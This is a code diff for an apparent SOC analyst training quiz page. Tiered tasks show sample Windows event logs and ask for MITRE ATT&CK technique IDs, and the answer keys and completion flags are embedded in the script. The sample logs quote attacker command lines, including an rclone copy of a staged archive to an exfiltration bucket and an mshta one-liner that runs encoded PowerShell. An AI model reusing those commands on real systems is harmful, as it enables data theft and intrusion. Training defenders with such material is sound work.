+          placeholder:'e.g. Initial Access, Execution, ...', answers:['initial access execution credential access lateral movement impact','initial access, execution, credential access, lateral movement, impact'],
+          hint:'Read the log chronologically: brute force → malware execution → lsass dump → SMB pivot → shadow deletion.' },
+        { title:'Threat Actor Attribution',
+          code:'Tools observed:\n  • Cobalt Strike Beacon (malleable C2 profile)\n  • BazarLoader second-stage dropper\n  • Ryuk ransomware encryptor\n\nBehaviour:\n  • 3-day dwell time before encryption\n  • Domain-wide deployment via GPO\n  • Shadow copies deleted, backups destroyed\n  • Targeted: US hospital network',
+          prompt:'Which threat group is most associated with this toolkit chain and targeting profile?',
+          placeholder:'Enter threat group name...', answers:['wizard spider','wizardspider','unc1878'],
+          hint:'BazarLoader + Cobalt Strike + Ryuk is a signature chain. This group is known for targeting healthcare.' },
+        { title:'Persistence via Registry Run Key',
+          code:'Event ID: 4657 — Registry Value Modified\nKey: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nValue Name: WindowsUpdate\nValue Data: C:\\Users\\Public\\svchost32.exe\nModified By: DESKTOP-4F2A1\\jsmith\nTimestamp: 2024-03-14 08:44:01',
+          prompt:'What MITRE ATT&CK sub-technique ID describes persistence via registry run keys?',
+          placeholder:'Enter sub-technique ID (T1547.xxx)...', answers:['t1547.001','1547.001'],
+          hint:'T1547 covers Boot or Logon Autostart Execution. Run keys are sub-technique .001.' },
+        { title:'Data Staged Before Exfiltration',
+          code:'Event ID: 4688 — 7-zip.exe\nCommandLine: 7z.exe a -p"P@ss2024!" C:\\ProgramData\\staged.7z C:\\Users\\*\\Documents\\\nEvent ID: 4688 — rclone.exe\nCommandLine: rclone copy C:\\ProgramData\\staged.7z remote:exfil-bucket\nDuration: 00:04:33 | Size: 4.2GB transferred',
+          prompt:'What MITRE ATT&CK technique ID covers staging data locally before exfiltration?',
+          placeholder:'Enter technique ID (T1xxx)...', answers:['t1074','1074','t1074.001','1074.001'],
+          hint:'Data was compressed and staged locally before being sent out. Look at T1074 — Data Staged.' }
+      ]
+    },
+    {
+      id:3, label:'EXPERT', tierClass:'tier-expert', accent:'#f85149',
+      terminalLabel:'soc-validation.sh — tier 4: expert [FINAL]',
+      roomName:'[ ROOM ] SOC ANALYST COMPETENCY CHECK — EXPERT',
+      roomDesc:'Elite incident response scenarios. No margin for error. Prove full-spectrum SOC capability.',
+      completionTitle:'ELITE SOC ANALYST',
+      completionSub:'All four tiers cleared. Full-spectrum SOC analyst proficiency confirmed.',
+      completionFlag:'THM{elite_soc_ir_analyst_certified}',
+      nextLabel:null,
+      tasks:[
+        { title:'Living off the Land Technique',
+          code:'Event ID: 4688\nProcess: mshta.exe\nCommandLine: mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -enc [blob]"",0:close")\nParent: winword.exe\nNo binary dropped to disk — fileless execution',
+          prompt:'What MITRE ATT&CK sub-technique describes mshta.exe being abused for fileless execution?',
+          placeholder:'Enter sub-technique ID (T1218.xxx)...', answers:['t1218.005','1218.005'],
+          hint:'T1218 covers Signed Binary Proxy Execution. mshta.exe is a signed Windows binary used for proxy execution — sub-technique .005.' },
+        { title:'Kerberoasting Identification',
+          code:'Event ID: 4769 — Kerberos Service Ticket Requested\nService Name: MSSQLSvc/sqlserver01.corp.local:1433\nTicket Encryption Type: 0x17 (RC4-HMAC)\nClient: jsmith@CORP.LOCAL\nSource IP: 192.168.1.101\n\nNote: RC4 is weak — ticket can be cracked offline',
+          prompt:'What MITRE ATT&CK sub-technique ID describes this offline ticket cracking attack?',
+          placeholder:'Enter sub-technique ID (T1558.xxx)...', answers:['t1558.003','1558.003'],
+          hint:'T1558 covers Steal or Forge Kerberos Tickets. Requesting RC4 tickets to crack offline is sub-technique .003 — Kerberoasting.' },
+        { title:'DCSync Attack Detection',
+          code:'Event ID: 4662 — Operation Performed on AD Object\nObject: DC=corp,DC=local\nAccesses: Control Access\nProperties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)\n            {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)\nSubject: DOMAIN\\compromised_admin\n\nNo DCSync process ran on the DC itself — replication simulated remotely',
+          prompt:'What MITRE ATT&CK sub-technique ID describes DCSync credential theft via AD replication APIs?',
+          placeholder:'Enter sub-technique ID (T1003.xxx)...', answers:['t1003.006','1003.006'],
+          hint:'T1003 is OS Credential Dumping. Abusing AD replication rights to pull NTLM hashes without touching lsass is sub-technique .006.' },
+        { title:'Full Incident Timeline',
+          code:'Day 1:  Phishing email → ISO → BumbleBee loader\nDay 1:  Cobalt Strike Beacon established\nDay 2:  Mimikatz — NTDS.dit extracted via ntdsutil IFM\nDay 2:  Lateral movement across 14 hosts via PsExec\nDay 3:  Rclone exfiltration → 47GB staged data sent to Mega.nz\nDay 3:  BlackCat/ALPHV encryptor deployed domain-wide via GPO\nDay 3:  All VSS deleted, backups wiped, ransom note dropped',
+          prompt:'What is the MITRE ATT&CK sub-technique ID for the NTDS.dit extraction method used on Day 2?',
+          placeholder:'Enter sub-technique ID (T1003.xxx)...', answers:['t1003.003','1003.003'],
+          hint:'ntdsutil IFM creates an offline copy of the AD database including NTDS.dit and SYSTEM hive. This is T1003 sub-technique .003.' }
+      ]
+    }
+  ];
+
+  // ─── STATE ────────────────────────────────────────────────────────────────
+  let currentTier = 0;
+  let completedTasks = new Set();
+  let tierStartTime = Date.now();
+
+  function normalize(s) { return s.toLowerCase().replace(/[^a-z0-9.,+ ]/g,'').trim(); }
+
+  // ─── RENDER TIER ──────────────────────────────────────────────────────────
+  function renderTier(idx) {
+    const tier = TIERS[idx];
+    completedTasks.clear();
+    tierStartTime = Date.now();
+
+    document.getElementById('terminal-title').textContent = tier.terminalLabel;
+    document.getElementById('room-name').textContent = tier.roomName;
+    document.getElementById('room-desc').textContent = tier.roomDesc;
+
+    const badge = document.getElementById('room-tier-badge');
+    badge.textContent = tier.label;
+    badge.className = `room-tier-badge ${tier.tierClass}`;
+
+    document.getElementById('room-progress-fill').style.background = tier.accent;
+    document.getElementById('room-progress-fill').style.width = '0%';
+    document.getElementById('room-progress-label').textContent = '0 / 4 Tasks';
+
+    document.querySelectorAll('.tier-pip').forEach(pip => {
+      const t = parseInt(pip.dataset.tier);
+      pip.className = 'tier-pip';
+      if (t < idx) pip.classList.add('done');
+      else if (t === idx) pip.classList.add('active');
+    });
+
+    const list = document.getElementById('task-list');
+    list.innerHTML = tier.tasks.map((task, i) => {
+      const n = i + 1;
+      return `
+        <div class="task-card ${n===1?'active':'locked'}" id="task${n}">
+          <div class="task-lock-bar"></div>
+          <div class="task-card-inner">
+            <div class="task-header">
+              <span class="task-num" style="color:${tier.accent};border-color:${tier.accent}40;background:${tier.accent}12">TASK ${n}</span>
+              <span class="task-title">${task.title}</span>
+              <span class="task-completed-badge">✔ SOLVED</span>
+            </div>
+            <div class="code-block">${task.code.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>
+            <div class="task-prompt">${task.prompt}</div>
+            <div class="task-input-row">
+              <input class="task-input" id="input${n}" type="text" placeholder="${task.placeholder}" autocomplete="off"/>
+              <button class="execute-btn" onclick="checkAnswer(${n})">Execute</button>
+            </div>
+            <div class="task-feedback" id="feedback${n}"></div>
+            ${task.hint ? `<button class="hint-btn" onclick="toggleHint(${n})">💡 Hint</button><div class="hint-text" id="hint${n}">${task.hint}</div>` : ''}
+          </div>
+        </div>`;
+    }).join('');
+
+    tier.tasks.forEach((_, i) => {
+      document.getElementById(`input${i+1}`).addEventListener('keydown', e => {
+        if (e.key === 'Enter') checkAnswer(i+1);
+      });
+    });
   }
 
-  // ─── QUIZ LOGIC ───────────────────────────────────────────────────────────
-  const answers = {
-    1: ['4624'],
-    2: ['lsass.exe', 'lsass'],
-    3: ['7045'],
-    4: ['volume shadow copies', 'shadow copies', 'vss', 'volume shadow copy service', 'shadow copy', 'windows shadow copies']
-  };
+  function toggleHint(n) { document.getElementById(`hint${n}`).classList.toggle('show'); }
 
-  let completed = new Set();
-
-  function normalize(str) {
-    return str.toLowerCase().replace(/[^a-z0-9. ]/g, '').trim();
-  }
-
-  function checkAnswer(taskNum) {
-    const input = document.getElementById(`input${taskNum}`);
-    const feedback = document.getElementById(`feedback${taskNum}`);
+  // ─── ANSWER CHECK ─────────────────────────────────────────────────────────
+  function checkAnswer(n) {
+    const tier = TIERS[currentTier];
+    const task = tier.tasks[n-1];
+    const input = document.getElementById(`input${n}`);
+    const feedback = document.getElementById(`feedback${n}`);
     const val = normalize(input.value);
-
     if (!val) return;
 
-    if (answers[taskNum].includes(val)) {
+    if (task.answers.includes(val)) {
       input.classList.remove('wrong');
-      input.classList.add('correct');
       input.disabled = true;
-      document.querySelector(`#task${taskNum} .execute-btn`).disabled = true;
-      feedback.textContent = '✔ Correct. Artifact identified.';
+      document.querySelector(`#task${n} .execute-btn`).disabled = true;
+      feedback.textContent = '✔ Correct. Advancing...';
       feedback.className = 'task-feedback feedback-correct';
-      completed.add(taskNum);
-      updateProgress();
+      feedback.style.color = tier.accent;
+      completedTasks.add(n);
+
+      setTimeout(() => {
+        document.getElementById(`task${n}`).classList.remove('active');
+        document.getElementById(`task${n}`).classList.add('completed');
+        updateProgress();
+        if (n < 4) unlockTask(n+1);
+        else triggerTierComplete();
+      }, 700);
     } else {
-      input.classList.remove('correct');
       input.classList.add('wrong');
       feedback.textContent = '✘ Incorrect. Review the telemetry and try again.';
       feedback.className = 'task-feedback feedback-wrong';
-      setTimeout(() => input.classList.remove('wrong'), 600);
+      setTimeout(() => input.classList.remove('wrong'), 500);
     }
+  }
+
+  function unlockTask(n) {
+    const card = document.getElementById(`task${n}`);
+    card.classList.remove('locked');
+    requestAnimationFrame(() => requestAnimationFrame(() => {
+      card.classList.add('active','unlocking');
+      setTimeout(() => card.classList.remove('unlocking'), 800);
+    }));
+    setTimeout(() => {
+      document.getElementById(`input${n}`).focus();
+      card.scrollIntoView({ behavior:'smooth', block:'center' });
+    }, 450);
   }
 
   function updateProgress() {
-    const count = completed.size;
-    const total = Object.keys(answers).length;
-    document.getElementById('progress-text').textContent = `Progress: ${count} / ${total} Tasks Completed`;
-    document.getElementById('progress-fill').style.width = `${(count / total) * 100}%`;
-    if (count === total) {
-      document.getElementById('lab-complete').classList.add('show');
-    }
+    const c = completedTasks.size;
+    document.getElementById('room-progress-label').textContent = `${c} / 4 Tasks`;
+    document.getElementById('room-progress-fill').style.width = `${(c/4)*100}%`;
   }
 
-  function resetLab() {
-    completed.clear();
-    for (let i = 1; i <= 4; i++) {
-      const input = document.getElementById(`input${i}`);
-      const feedback = document.getElementById(`feedback${i}`);
-      const btn = document.querySelector(`#task${i} .execute-btn`);
-      input.value = '';
-      input.disabled = false;
-      input.className = 'task-input';
-      feedback.textContent = '';
-      feedback.className = 'task-feedback';
-      btn.disabled = false;
+  // ─── TIER COMPLETE ────────────────────────────────────────────────────────
+  function triggerTierComplete() {
+    const tier = TIERS[currentTier];
+    const elapsed = Math.round((Date.now() - tierStartTime) / 1000);
+    const mins = Math.floor(elapsed/60);
+    const secs = (elapsed%60).toString().padStart(2,'0');
+    document.getElementById('stat-time').textContent = `${mins}m${secs}s`;
+    document.getElementById('stat-tasks').textContent = `${(currentTier+1)*4}/16`;
+    document.getElementById('completion-flag').textContent = tier.completionFlag;
+    document.getElementById('completion-title').textContent = tier.completionTitle;
+    document.getElementById('completion-sub').textContent = tier.completionSub;
+
+    const isLast = currentTier === TIERS.length - 1;
+    const nextBtn = document.getElementById('next-tier-btn');
+    if (isLast) {
+      nextBtn.textContent = '✔ All Tiers Cleared';
+      nextBtn.disabled = true; nextBtn.style.opacity = '0.5';
+      document.getElementById('stat-tasks').textContent = '16/16';
+    } else {
+      nextBtn.textContent = `→ Advance to ${tier.nextLabel}`;
+      nextBtn.disabled = false; nextBtn.style.opacity = '1';
     }
-    updateProgress();
-    document.getElementById('lab-complete').classList.remove('show');
+    document.getElementById('retry-tier-btn').textContent = `↺ Retry ${tier.label}`;
+
+    setTimeout(() => {
+      document.getElementById('completion-overlay').classList.add('show');
+      startParticles(tier.accent);
+      startTypewriter(currentTier);
+    }, 500);
   }
 
-  // Enter key support
-  document.querySelectorAll('.task-input').forEach((el, i) => {
-    el.addEventListener('keydown', (e) => {
-      if (e.key === 'Enter') checkAnswer(i + 1);
-    });
-  });
+  function advanceTier() {
+    if (currentTier >= TIERS.length-1) return;
+    currentTier++;
+    document.getElementById('completion-overlay').classList.remove('show');
+    const list = document.getElementById('task-list');
+    list.style.opacity = '0'; list.style.transform = 'translateY(-8px)';
+    setTimeout(() => {
+      renderTier(currentTier);
+      list.style.transition = 'opacity 0.4s, transform 0.4s';
+      list.style.opacity = '1'; list.style.transform = 'translateY(0)';
+      document.getElementById('room-terminal').scrollIntoView({ behavior:'smooth', block:'start' });
+    }, 300);
+  }
+
+  function retryTier() {
+    document.getElementById('completion-overlay').classList.remove('show');
+    setTimeout(() => renderTier(currentTier), 300);
+  }
+
+  // ─── TYPEWRITER + PARTICLES ───────────────────────────────────────────────
+  const twSets = [
+    ['Initial access artifacts identified.','SOC response workflow validated.','Flag: THM{soc_novice_certified}'],
+    ['Sub-technique mapping complete.','Log correlation chain verified.','Flag: THM{soc_intermediate_analyst}'],
+    ['Kill chain reconstruction: confirmed.','Threat attribution validated.','Flag: THM{soc_hard_ir_analyst}'],
+    ['All four tiers cleared. Elite status confirmed.','Full-spectrum SOC proficiency verified.','Flag: THM{elite_soc_ir_analyst_certified}']
+  ];
+
+  function startTypewriter(tierIdx) {
+    const lines = twSets[tierIdx];
+    const el = document.getElementById('typewriter-text');
+    let li=0, ci=0; el.textContent='';
+    function type() {
+      if (li >= lines.length) return;
+      const line = lines[li];
+      if (ci < line.length) { el.textContent = line.slice(0,++ci); setTimeout(type,40); }
+      else { setTimeout(()=>{ li++; ci=0; if(li<lines.length){el.textContent='';setTimeout(type,300);} },1200); }
+    }
+    setTimeout(type,500);
+  }
+
+  function startParticles(color) {
+    const canvas = document.getElementById('completion-canvas');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const chars=['0','1','T','P','>','✔','#','$','?'];
+    const particles=[];
+    function spawn(n){ for(let i=0;i<n;i++) particles.push({x:Math.random()*canvas.width,y:canvas.height*0.5+Math.random()*canvas.height*0.5,vy:-(Math.random()*2.5+0.8),vx:(Math.random()-0.5)*1.2,alpha:Math.random()*0.6+0.3,char:chars[Math.floor(Math.random()*chars.length)],size:Math.random()*11+7,decay:Math.random()*0.004+0.002}); }
+    spawn(80); let waves=0;
+    const wi=setInterval(()=>{ if(waves++>4){clearInterval(wi);return;} spawn(35); },600);
+    function draw(){ ctx.clearRect(0,0,canvas.width,canvas.height); let alive=false; particles.forEach(p=>{ if(p.alpha<=0)return; alive=true; ctx.globalAlpha=p.alpha; ctx.fillStyle=color; ctx.font=`${p.size}px 'Share Tech Mono',monospace`; ctx.fillText(p.char,p.x,p.y); p.y+=p.vy;p.x+=p.vx;p.alpha-=p.decay; }); if(alive)requestAnimationFrame(draw); }
+    draw();
+  }
+
+  renderTier(0);
 </script>
+<script src="matrix.js"></script>
 </body>
 </html>
